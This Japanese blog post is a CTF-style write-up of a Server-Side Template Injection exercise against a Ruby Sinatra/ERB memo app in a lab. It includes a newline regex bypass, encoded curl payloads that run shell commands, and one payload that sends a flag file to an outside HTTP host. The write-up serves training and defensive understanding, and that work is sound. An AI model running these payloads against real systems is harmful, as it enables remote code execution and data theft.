---
layout: post
title: Harekaze 内で出題した SSTI 問の解説
categories: [ctf, harekaze]
date: 2017-12-08 23:00:00 +0900
---

これは [Harekaze Advent Calendar 2017](https://adventar.org/calendars/2292) の 8 日目の記事です。

---

12 月 4 日から 8 日にかけて、チーム Harekaze 内で Server-Side Template Injection (SSTI) の解説資料 (内容は攻撃手法やその対策など) を公開し、このまとめとして、作成した演習問題をチームメンバーに解いてもらうという取り組みを行いました。

ということで、出題した問題とその解説を公開します。

## 問題文

演習問題として、演習環境の 4567 番ポートでとある言語とテンプレートエンジンを使って作られたサービスが動いています。

`/source` にアクセスすることでソースコードが見られるので、どこで、どうすれば SSTI ができるか考えてみてください。

また、SSTI を利用して `flag` というファイルの内容を取得してみてください。

[exercise.tar.gz](../files/20171204-harekaze-ssti-problem/exercise.tar.gz)

## write-up

まず `/source` にアクセスしてソースコードを取得します。

```ruby
require 'sinatra'
require 'logger'

set :public_folder, File.dirname(__FILE__) + '/static'
enable :sessions

logger = Logger.new('sinatra.log')

def is_valid(s)
  return /^[0-9A-Za-z]+$/ =~ s
end

get '/' do
  erb :index
end

post '/add' do
  unless session[:memos]
    session[:memos] = []
  end
  unless is_valid(params[:memo])
    redirect to('/')
  end
  session[:memos].push params[:memo]
  logger.info erb("memo ('#{params[:memo]}') added", :layout => false)
  redirect to('/')
end

get '/clear' do
  if params[:id]
    id = params[:id].to_i
    logger.info erb("memo ('#{session[:memos][id]}') deleted", :layout => false)
    session[:memos].slice! id
  else
    session.clear
  end
  redirect to('/')
end

get '/source' do
  File.open(__FILE__, 'r').read
end
```

`do` `end` のような構文から Ruby で書かれていること、`require 'sinatra'` から [Sinatra](http://sinatrarb.com) というライブラリを使っていること、`erb :index` から [erb](https://docs.ruby-lang.org/ja/latest/class/ERB.html) をテンプレートエンジンに使っていることが分かります。

どこかでユーザ入力がそのまま `erb` に渡っていないか探してみると、以下のような箇所が見つかりました。

```ruby
post '/add' do
  unless session[:memos]
    session[:memos] = []
  end
  unless is_valid(params[:memo])
    redirect to('/')
  end
  session[:memos].push params[:memo]
  logger.info erb("memo ('#{params[:memo]}') added", :layout => false)
  redirect to('/')
end
```

メモの追加処理で、追加されるメモの内容をそのまま `erb` に渡し、その返り値をログとして出力しています。SSTI ができそうです。

`is_valid` でメモの内容を検証しているようなので、どのような処理が行われているか確認します。

```ruby
def is_valid(s)
  return /^[0-9A-Za-z]+$/ =~ s
end
```

正規表現を使って、英数字だけで構成されているか検証しているらしいと分かりました。文字列の先頭と末尾を示すために `^` と `$` を使っていますが、Ruby では `^` は**行頭**に、`$` は**行末**にマッチします。(参照: [正規表現によるバリデーションでは ^ と $ ではなく \A と \z を使おう \| 徳丸浩の日記](https://blog.tokumaru.org/2014/03/z.html))

これを利用して、`curl -v http://192.168.99.100:4567/add -d "memo=1%0Apwned!"` のように改行文字を使うと、本来は入力できない文字をメモとして追加することができました。

erb の文法を確認すると、`<% ... %>` は中の式を実行し、`<%= ... %>` は中の式を評価した結果を出力することが分かりました。これで任意のコードを実行する方法が分かりました。

しかし、erb で処理した結果はユーザからは読めない場所 (`sinatra.log`) に書き込まれるため、なにか別の方法で得る必要があります。

今回は外向きの通信が許可されているので、[net/http](https://docs.ruby-lang.org/ja/latest/library/net=2fhttp.html) を使って、あらかじめ用意した HTTP サーバにアクセスさせます。

`require 'net/http'; Net::HTTP.get_print 'example.com', File.read('flag'), 8000` で `http://example.com:8000/(flag の内容)` にアクセスが来るはずです。

```
$ curl -v http://192.168.99.100:4567/add -d "memo=1%0A%3C%25%3D%20require%20'net%2Fhttp'%3B%20Net%3A%3AHTTP.get_print%20'example.com'%2C%20File.read('flag')%2C%208000%20%25%3E"
```

```
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
... - - [04/Dec/2017 17:35:22] code 404, message File not found
... - - [04/Dec/2017 17:35:22] "GET flag{<ruby>\xe5\x92\x8c\xe4\xbd\x8f<rt>\xe3\x82\x8f\xe3\x81\x9a\xe3\x81\xbf</rt>\xe5\xaa\x9b\xe8\x90\x8c<rt>\xe3\x81\xb2\xe3\x82\x81</rt></ruby>} HTTP/1.1" 404 -
```

フラグが得られました。

```
flag{<ruby>和住<rt>わずみ</rt>媛萌<rt>ひめ</rt></ruby>}
```

---

## 他の方の解法

以上が私の解法でした。これ以外の解法として、[@megumish](https://twitter.com/megumish) さんに教えていただいたものを 2 つ紹介します。

### 1

```
<% abort `cat flag` %>
```

[`Kernel.#abort`](https://docs.ruby-lang.org/ja/latest/method/Kernel/m/abort.html) は引数として文字列を与えると、それをエラーメッセージとして出力して終了するメソッドです。

実際に試してみましょう。

```
$ curl http://192.168.99.100:4567/add -d "memo=A%0a%3C%25%20abort%20%60cat%20flag%60%20%25%3E"
SystemExit: flag{<ruby>和住<rt>わずみ</rt>媛萌<rt>ひめ</rt></ruby>}
        /app/app.rb:26:in `abort'
        /app/app.rb:26:in `block in singleton class'
        /app/app.rb:18:in `instance_eval'
        /app/app.rb:18:in `singleton class'
        /app/app.rb:15:in `__tilt_47037131226660'
...
```

エラーメッセージとして `flag` の内容が表示されました。

ちなみに、`Dockerfile` の最終行を以下のように変更すると例外が発生しても詳細な情報が出力されなくなり、この解法では一発でフラグが得られなくなります。

```diff
-CMD ["bundle", "exec", "rackup", "-p", "4567", "-o", "0.0.0.0"]
+CMD ["bundle", "exec", "rackup", "-p", "4567", "-o", "0.0.0.0", "-E", "production"]
```

```
$ curl http://192.168.99.100:4567/add -d "memo=A%0a%3C%25%20abort%20%60cat%20flag%60%20%25%3E"
<h1>Internal Server Error</h1>
```

### 2

```
<% session[:memos].push `cat flag` %>
```

当然ながら `session` にもアクセスできるので、メモが配列として保存されている `session[:memos]` に `flag` の内容を追加することで読み出すことができます。

実際に試してみましょう。

```
$ curl http://192.168.99.100:4567/add -c "cookie.txt" -d "memo=A%0a%3C%25%20session%5B%3Amemos%5D.push%20%60cat%20flag%60%20%25%3E"
$ curl http://192.168.99.100:4567 -b "cookie.txt"
<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <link rel="stylesheet" href="/style.css">
    <title>SSTI exercise</title>
  </head>
  <body>
    <main>
      <h1>SSTI exercise</h1>
      <nav>
        <a href="/clear">clear</a> / <a href="/source">source</a>
      </nav>
            <h2>Memo</h2>
      <form action="/add" method="POST">
        <input type="text" name="memo" id="memo" autofocus>
        <input type="submit">
      </form>
      <h2>History</h2>
      <ul>
      
        
          <li>A
<% session[:memos].push `cat flag` %> <a href="clear?id=0">del</a></li>
        
          <li>flag{<ruby>和住<rt>わずみ</rt>媛萌<rt>ひめ</rt></ruby>} <a href="clear?id=1">del</a></li>
        
      
      </ul>
    </main>
  </body>
</html>
```

`flag` の内容がメモとして表示されました。